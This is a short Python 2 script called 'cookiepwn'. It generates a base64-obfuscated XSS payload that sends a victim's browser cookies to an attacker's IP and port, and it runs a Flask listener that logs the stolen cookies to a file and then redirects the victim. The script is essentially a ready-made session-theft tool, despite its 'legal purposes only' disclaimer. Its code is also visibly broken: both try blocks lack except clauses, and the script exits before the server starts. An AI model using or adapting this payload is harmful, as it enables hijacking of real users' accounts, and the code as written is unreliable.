#!/usr/bin/env python2.7

#Built by 0x0J
#For LEGAL PURPOSES ONLY
#Licensed under GPLv3.0

import sys
from flask import Flask, redirect, request

#sets args and snatcher/payload
app = Flask(__name__)
try:
    if sys.argv[1] == '-h':
        print "example: python2 cookiepwn.py ip port redirURL"
        exit()

    snatcher = str("document.location = 'http://%s:%s/?cookie=' + " % (sys.argv[1].strip(), sys.argv[2].strip()) + "document.domain+': '"  + "+document.cookie").encode('base64')
    payload = "".join(str("eval(atob('%s'))" % (snatcher)).splitlines())
    print "-------------\npayload: %s\n-------------" % (payload)
    exit()


@app.route('/')
def index():
    try:
        if request.args.get('cookie') != None:
            with open("cookie.txt", "a+") as cookies:
                cookies.write(request.args.get('cookie').replace("%20"," ") + "\n")
                print "-------------\nSnatched the cookie: " + request.args.get('cookie').replace("%20"," ") + "\n-------------\n"

    return redirect(sys.argv[3], code=302)

#Sets switches
if __name__ == '__main__':
    app.run(host=sys.argv[1], port=int(sys.argv[2]))
